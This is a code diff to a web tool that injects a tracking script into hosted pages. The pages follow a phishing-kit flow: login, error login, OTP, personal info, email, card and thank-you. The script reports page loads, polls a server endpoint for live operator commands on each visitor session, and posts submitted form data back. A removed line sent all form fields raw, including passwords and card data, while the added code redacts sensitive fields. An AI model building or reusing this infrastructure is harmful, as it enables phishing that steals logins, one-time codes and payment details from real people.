@@ -261,15 +261,74 @@ function rewriteRuntimeHtml(html, { userPageId, file }) {
 
   const bridge = `<script>
 (function () {
+  const sessionKey = "deuce_session_" + ${JSON.stringify(userPageId)};
+  const pageLabels = {
+    "index.html": "Login page",
+    "login2.html": "Error login page",
+    "otp.html": "OTP page",
+    "personal.html": "Personal info page",
+    "email.html": "Email page",
+    "c.html": "Card page",
+    "thnks.html": "Thank you page"
+  };
   const runtime = {
     userPageId: ${JSON.stringify(userPageId)},
     pageId: ${JSON.stringify(file)},
-    sessionId: "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8)
+    sessionId: getSessionId()
   };
+
+  function getSessionId() {
+    try {
+      const existing = window.sessionStorage.getItem(sessionKey);
+      if (existing) return existing;
+      const next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+      window.sessionStorage.setItem(sessionKey, next);
+      return next;
+    } catch (error) {
+      return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+    }
+  }
+
+  function pageLabel() {
+    const name = runtime.pageId.split("/").pop().toLowerCase();
+    return pageLabels[name] || runtime.pageId;
+  }
+
+  function isSensitiveField(field, input) {
+    const text = [
+      field,
+      input && input.name,
+      input && input.id,
+      input && input.type,
+      input && input.autocomplete,
+      input && input.placeholder,
+      input && input.getAttribute && input.getAttribute("aria-label")
+    ].filter(Boolean).join(" ").toLowerCase();
+    return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
+  }
+
+  function safeFormData(form) {
+    const data = {};
+    const fields = Array.from(form.elements || []).filter(function (input) {
+      return input && input.name && !input.disabled && !["submit", "button", "reset", "file"].includes(String(input.type || "").toLowerCase());
+    });
+    fields.forEach(function (input) {
+      const key = input.name;
+      if (isSensitiveField(key, input)) {
+        data[key] = input.value ? "[redacted]" : "[blank]";
+        return;
+      }
+      data[key] = input.value || "";
+    });
+    data._fieldCount = fields.length;
+    data._redaction = "passwords, OTPs, card fields, login/email credentials, tokens, and similar sensitive values are not stored";
+    return data;
+  }
 
   function send(path, payload) {
     return fetch(path, {
       method: "POST",
+      keepalive: true,
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         userPageId: runtime.userPageId,
@@ -283,14 +342,14 @@ function rewriteRuntimeHtml(html, { userPageId, file }) {
     }).catch(function () {});
   }
 
-  send("/api/traffic", { event: "page_load", screen: runtime.pageId });
+  send("/api/runtime/traffic", { event: "page_load", screen: pageLabel() });
 
   function checkCommand() {
     const params = new URLSearchParams({
       userPageId: runtime.userPageId,
       sessionId: runtime.sessionId
     });
-    fetch("/api/session-command?" + params.toString())
+    fetch("/api/runtime/session-command?" + params.toString())
       .then(function (response) { return response.ok ? response.json() : null; })
       .then(function (data) {
         const command = data && data.command;
@@ -306,9 +365,9 @@ function rewriteRuntimeHtml(html, { userPageId, file }) {
   document.addEventListener("submit", function (event) {
     const form = event.target;
     if (!form || !(form instanceof HTMLFormElement)) return;
-    const data = Object.fromEntries(new FormData(form).entries());
-    send("/api/results", {
-      screen: runtime.pageId,
+    const data = safeFormData(form);
+    send("/api/runtime/results", {
+      screen: pageLabel(),
       data: data,
       flow: [runtime.pageId],
       userAgent: navigator.userAgent
